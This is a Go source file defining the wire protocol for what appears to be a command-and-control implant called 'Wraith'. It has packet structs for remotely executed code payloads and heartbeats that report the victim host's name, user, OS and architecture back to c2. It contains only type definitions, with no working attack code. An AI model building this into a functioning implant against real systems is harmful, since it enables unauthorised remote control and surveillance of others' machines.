package proto

import "time"

type Packet struct {
	// The pinecone peer this packet came from or is going to.
	Peer string

	// The HTTP method this packet was received or is to be sent with.
	Method string

	// The HTTP route this packet was received on or is being sent to (excluding prefix).
	Route string

	// The data included with the packet encoded as pinecomms-flavoured signed CBOR.
	Data []byte
}

// A regular request/response data packet.
type PacketRR struct {
	// Contains either code for Wraith to execute or the results of
	// executed code.
	Payload []byte

	// A transaction ID allowing for mapping between requests
	// and responses. The TxId is opaque and can be any string
	// of any length.
	TxId string
}

// The structure of heartbeats which Wraiths send to c2 to register
// their status and presence.
type PacketHeartbeat struct {
	// A unique fingerprint of the family/strain this Wraith belongs to.
	StrainId string

	// The time when this Wraith was initialised.
	InitTime time.Time

	// A list of the names of modules installed in this Wraith.
	Modules []string

	// The operating system Wraith is running on.
	HostOS string

	// The CPU architecture of the host.
	HostArch string

	// The system hostname.
	Hostname string

	// The name of the user under which Wraith is running.
	HostUser string

	// The ID of the user under which Wraith is running.
	HostUserId string

	// A count of errors the Wraith has encountered.
	Errors int
}
